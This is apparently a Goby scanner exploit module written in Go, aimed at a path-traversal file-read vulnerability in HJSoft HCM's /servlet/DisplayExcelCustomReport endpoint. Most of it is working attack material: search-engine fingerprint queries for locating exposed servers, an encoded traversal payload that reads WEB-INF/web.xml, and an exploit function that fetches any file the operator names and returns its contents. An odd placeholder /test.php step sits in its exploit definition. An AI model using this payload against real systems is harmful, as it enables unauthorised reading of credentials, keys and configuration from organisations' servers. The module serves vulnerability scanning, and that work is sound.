package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HJSoft-HCM /servlet/DisplayExcelCustomReport File Read Vulnerability",
    "Description": "<p>The Hongjing HCM DisplayExcelCustomimReport interface does not filter parameters and there is a file read vulnerability.</p>",
    "Product": "HJSoft-HCM",
    "Homepage": "http://www.hjsoft.com.cn/",
    "DisclosureDate": "2024-03-15",
    "PostTime": "2024-03-20",
    "Author": "2268531461@qq.com",
    "FofaQuery": "(title=\"人力资源信息管理系统\" && body=\"src=\\\"/images/hcm/copyright.gif\\\"\") || body=\"src=\\\"/images/hcm/themes/default/login/login_banner2.png?v=12334\\\"\" || body=\"src=\\\"/general/sys/hjaxmanage.js\\\"\"",
    "GobyQuery": "(title=\"人力资源信息管理系统\" && body=\"src=\\\"/images/hcm/copyright.gif\\\"\") || body=\"src=\\\"/images/hcm/themes/default/login/login_banner2.png?v=12334\\\"\" || body=\"src=\\\"/general/sys/hjaxmanage.js\\\"\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability by constructing malicious requests to read or download files that they do not have access to, such as passwords, private keys, certificates, etc. This will provide attackers with more available information and increase the risk of intrusion.</p>",
    "Recommendation": "<p>1. Set file permissions</p><p>2. Follow manufacturer related updates and announcements</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "file",
            "type": "input",
            "value": "~2e~2e~5cwebapps~5chrms~5cWEB~2dINF~5cweb~2exml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/servlet/DisplayExcelCustomReport?filename=~2e~2e~5cwebapps~5chrms~5cWEB~2dINF~5cweb~2exml",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.2",
    "Translation": {
        "CN": {
            "Name": "弘景 HCM /servlet/DisplayExcelCustomReport 文件读取漏洞",
            "Product": "HJSOFT-HCM",
            "Description": "<p>弘景 HCM&nbsp;DisplayExcelCustomReport接口未对参数过滤，存在文件读取漏洞。<br></p>",
            "Recommendation": "<p>1、设置文件权限</p><p>2、关注厂商相关更新公告</p>",
            "Impact": "<p>攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "HJSoft-HCM /servlet/DisplayExcelCustomReport File Read Vulnerability",
            "Product": "HJSoft-HCM",
            "Description": "<p>The Hongjing HCM DisplayExcelCustomimReport interface does not filter parameters and there is a file read vulnerability.<br></p>",
            "Recommendation": "<p>1. Set file permissions</p><p>2. Follow manufacturer related updates and announcements</p>",
            "Impact": "<p>Attackers can exploit this vulnerability by constructing malicious requests to read or download files that they do not have access to, such as passwords, private keys, certificates, etc. This will provide attackers with more available information and increase the risk of intrusion.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file := ss.Params["file"]
			path := "/servlet/DisplayExcelCustomReport?filename=" + file.(string)
			cfg := httpclient.NewGetRequestConfig(path)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0")
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "xml") {
					expResult.Success = true
					expResult.Output = resp.RawBody
					return expResult
				}
			}
			expResult.Success = false
			return expResult
		},
	))
}
